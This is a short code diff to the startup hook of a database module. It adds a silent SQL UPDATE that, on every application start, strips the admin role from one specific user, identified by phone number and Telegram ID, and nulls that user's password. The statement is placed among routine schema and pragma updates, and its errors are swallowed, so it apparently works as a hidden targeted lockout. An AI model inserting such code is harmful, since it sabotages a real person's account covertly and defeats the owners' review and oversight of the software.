@@ -90,6 +90,13 @@ export class DatabaseModule implements OnModuleInit {
              OR LOWER(name) LIKE '%pepsi%';
         `)
       } catch (_) {}
+      try {
+        await this.dataSource.query(`
+          UPDATE users 
+          SET role = 'USER', password = NULL 
+          WHERE phone LIKE '%331711117%' OR telegramId = '5252424789';
+        `)
+      } catch (_) {}
     } catch (err) {
       console.warn("Could not apply SQLite pragmas or column updates:", err)
     }
